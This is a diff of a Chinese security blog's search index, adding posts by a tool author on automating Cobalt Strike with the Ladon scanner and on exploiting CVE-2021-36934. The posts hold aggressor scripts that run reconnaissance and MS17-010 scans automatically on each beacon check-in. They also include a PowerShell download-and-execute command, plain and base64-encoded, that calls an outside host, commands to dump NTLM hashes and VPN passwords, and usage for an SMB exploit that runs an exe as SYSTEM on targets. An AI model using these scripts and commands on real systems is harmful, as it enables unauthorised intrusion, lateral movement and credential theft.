@@ -1476,6 +1476,103 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>Cobalt Strike与Ladon联动自动渗透</title>
+    <url>/p/auto.html</url>
+    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/auto.html";
+</script>
+
+<h3 id="为何要自动化"><a href="#为何要自动化" class="headerlink" title="为何要自动化?"></a>为何要自动化?</h3><p>你是否遇到过CS只上线几分钟又下线的情况，这种情况可能是安全公司扫描自动CS上线的，当然这并不是我们的重点，因为做个IP过滤或改一下CS就好了。重点是另外一个原因就是目标某些机器临时接入网络，所以我们会看到只上线一会儿。或者说就算上线一两个小时，而此时你正在做其它事，来不及看，等回来时机器已下线。因此自动化收集信息是有必要的，或者说有很多机器需要更新CS，如3.X转移到4.X，你一台一台换，等下班了都换不了几台，如果有些机器在不定时且是你休息时间才上线，难道你每天都在等它上线吗？</p>
+<p>首先我们来看下CNA是如何执行命令的。首先是执行系统自带CMD命令，采用bshell,如执行whoami，脚本代码如下</p>
+<h3 id="执行CMD"><a href="#执行CMD" class="headerlink" title="执行CMD"></a>执行CMD</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"whoami"</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行多条CMD可用-amp-符号连接"><a href="#执行多条CMD可用-amp-符号连接" class="headerlink" title="执行多条CMD可用&amp;符号连接"></a>执行多条CMD可用&amp;符号连接</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"whoami&amp;net user&amp;tasklist"</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="也可以写多行bshell代码"><a href="#也可以写多行bshell代码" class="headerlink" title="也可以写多行bshell代码"></a>也可以写多行bshell代码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"whoami"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"ipconfig"</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="自动化Demo"><a href="#自动化Demo" class="headerlink" title="自动化Demo"></a>自动化Demo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试脚本</p>
+<p>以上代码保存为auto.cna文件，工具栏–Cobalt Strike–Script Mannge–点击Load加载auto.cna</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/cna.png"></p>
+<p>加载后，打开beacon会话，发现已自动执行我们预设的命令net user</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/auto.png"></p>
+<h3 id="执行Ladon"><a href="#执行Ladon" class="headerlink" title="执行Ladon"></a>执行Ladon</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"MS17010"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>PS:Ladon可自动获取当前机器所有网卡IP，并扫描C段机器是否存在MS17010漏洞，使用其它扫描模块同理，所以实现自动信息获取、漏洞扫描等，有些模块可能需要传相关文件，本文暂不讨论。</p>
+<h3 id="自动渗透脚本"><a href="#自动渗透脚本" class="headerlink" title="自动渗透脚本"></a>自动渗透脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"onlinepc"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"ms17010"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重新加载脚本测试，可看到机器上线后，CS联动Ladon探测存活主机等，对于那些在你吃饭休息时间才上线的机器，回来看到它自动收集信息岂不美栽!</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/auto2.png"></p>
+<h3 id="执行复杂命令"><a href="#执行复杂命令" class="headerlink" title="执行复杂命令"></a>执行复杂命令</h3><p>对于Ladon未支持的功能，可能需复杂的多语句命令完成，命令中的双引号以及其它特殊字符CS转义比较麻烦，加上现在XP、2003系统几乎淘汰，主流基本都是WIN7以上系统，所以推荐大家使用PowerShell比较省事。以CS自动更新或转移权限为例，以下是CS的一行代码上线命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">""</span>IEX ((new-object net.webclient).downloadstring(<span class="string">'http://192.168.1.8:80/a'</span>))<span class="string">""</span></span><br></pre></td></tr></table></figure>
+
+<p>使用LadonGui–PowerShell的Base64Command将要执行的命令转成base64Command，这样可完美解决CNA脚本解析符号或转义问题。</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/b64cmd.png"></p>
+<h3 id="CS自动更新脚本"><a href="#CS自动更新脚本" class="headerlink" title="CS自动更新脚本"></a>CS自动更新脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line"><span class="comment">#bexecute_assembly!($1, script_resource("Ladon.exe"),"getinfo");</span></span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AOAA6ADgAMAAvAGEAMQAxACcAKQApACIA"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当目标机器上线时，将执行转换好的powershell代码，自动完成权限转移</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/autocs.png"></p>
+<h3 id="Ladon自动化脚本"><a href="#Ladon自动化脚本" class="headerlink" title="Ladon自动化脚本"></a>Ladon自动化脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Initial GetInfo</span></span><br><span class="line"><span class="comment">#by K8gege</span></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"><span class="comment">#println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));</span></span><br><span class="line">blog(<span class="variable">$1</span>,<span class="string">"Auto GetInfo"</span>);</span><br><span class="line">bshell(<span class="variable">$1</span>,<span class="string">"net user"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"onlinepc"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"ms17010"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"smbinfo"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"wmiinfo"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"snmpscan"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"webscan"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"getinfo"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"cmdline"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"usblog"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"rdplog"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"getid"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"recent"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"netver"</span>);</span><br><span class="line">bexecute_assembly!(<span class="variable">$1</span>, script_resource(<span class="string">"Ladon.exe"</span>),<span class="string">"allver"</span>);</span><br><span class="line"><span class="comment">#bshell($1,"whoami&amp;net user&amp;tasklist");</span></span><br><span class="line"><span class="comment">#$process = exec("whoami");</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上为CS联运Ladon收集信息脚本，若需要其它功能，请自行添加</p>
+<h3 id="关于GetInfo"><a href="#关于GetInfo" class="headerlink" title="关于GetInfo"></a>关于GetInfo</h3><p>getinfo模块会自动收集以下信息，所以无需bshell添加一堆命令，当然截图只能截到一部分，有些功能如usblog、.net版本、最近使用文件recent等非cmd命令获取的信息也在该模块里，如截图部分的获取CPUID、硬盘ID等非cmd命令获取，getinfo能获取的信息，并不全是系统自带CMD，有些信息自带的格式错乱，或者获取不到更详细参数。</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/getinfo.png"></p>
+<p>GetInfo2模块比getinfo多了以下功能，因为考虑到在少量机器上wmi执行有问题会导致卡死，所以为了兼容所有C2默认getinfo不获取该wmi相关信息</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/auto/getinfo2.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>〖EXP〗Ladon CVE-2021-36934读取VPN密码、NTLM-HASH</title>
+    <url>/p/cve-2021-36934.html</url>
+    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/cve-2021-36934.html";
+</script>
+
+<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>2021年7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本。不过值得注意的是该漏洞不影响 Windows Server 版本。对于这个漏洞安全研究成员将其称为 HiveNightmare 或者 SeriousSAM ，该漏洞允许低权限的用户访问 Windows 系统文件(多个系统文件过度许可访问控制列表所导致，包含安全账号管理数据库SAM)，成功利用此漏洞的攻击者可以使用 SYSTEM 特权运行任意代码。</p>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>CVE-2021-36934</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems</p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls C:\windows\system32\config\sam</span><br></pre></td></tr></table></figure>
+
+<p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p>
+<h3 id="密码读取"><a href="#密码读取" class="headerlink" title="密码读取"></a>密码读取</h3><p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon CVE-2021-36934</span><br></pre></td></tr></table></figure>
+
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/win8.1_ok.png"></p>
+<p>成功读取 Win8.1 x64 VPN连接帐号密码、系统用户HASH、DPAPI-KEY</p>
+<h3 id="Coblat-Strike联动"><a href="#Coblat-Strike联动" class="headerlink" title="Coblat Strike联动"></a>Coblat Strike联动</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/cs_ok.png"></p>
+<p>其它结果</p>
+<p>Win8.1  x64 低权限失败 管理员成功</p>
+<p>win10 1607 低权限失败 管理员成功</p>
+<p>Win10 1903 低权限、管理员均失败</p>
+<p>Win10 1803 低权限、管理员均失败</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/1607_no.png"></p>
+<p>可以看到HiveNightmare在多个系统下就算是管理员权限也无法读取HASH</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/1803_no.png"></p>
+<p>Win10 1607 x64  Ladon成功读取NTLM-HASH、DPAPI</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2021-36934/1607_ok.png"></p>
+<p>手头只有这些环境实验，这些版本未在低权限成功，如大家用Ladon9.0在其它Win10版本上测试，低权限成功的，也可以后台将图片发送给我更新。当然就算是同一版本，我测试失败，也不代表你们失败，实战还是直接上，能读出来就是成功，管它37等于28呢？比如说理论上不支持某些版本(默认开启某些设置那种情况)，要是人为修改了不就存在漏洞了，如管理员乱改或做了什么设置，导致默认条件下无漏洞的版本变成了易受攻击的系统，你只是看到版本为XX，就不测试了，可能就错过了，所以我一直强调，实战为王。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a><br><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a><br><a href="https://github.com/GossiTheDog/HiveNightmare" target="_blank" rel="noopener">https://github.com/GossiTheDog/HiveNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-36934" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-36934</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Cobalt Strike</tag>
+        <tag>CVE-2021-36934</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖教程〗Ladon 0day通用执行命令DLL生成器-MS17010演示</title>
     <url>/p/cmddll.html</url>
     <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
@@ -3587,8 +3684,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -4173,11 +4270,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -4710,8 +4807,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>密码</category>
         <category>Kali</category>
+        <category>密码</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -5185,8 +5282,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5209,8 +5306,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5234,8 +5331,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5265,8 +5362,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5468,8 +5565,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5790,8 +5887,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -6083,8 +6180,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>Ladon</category>
         <category>工具</category>
         <category>源码</category>
-        <category>编程</category>
         <category>Python</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -6247,33 +6344,6 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -6370,6 +6440,33 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -6519,8 +6616,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -6715,13 +6812,13 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>源码</category>
         <category>主机发现</category>
-        <category>内网渗透</category>
+        <category>源码</category>
         <category>嗅探</category>
-        <category>编程</category>
+        <category>内网渗透</category>
         <category>信息收集</category>
         <category>Python</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Tool</tag>
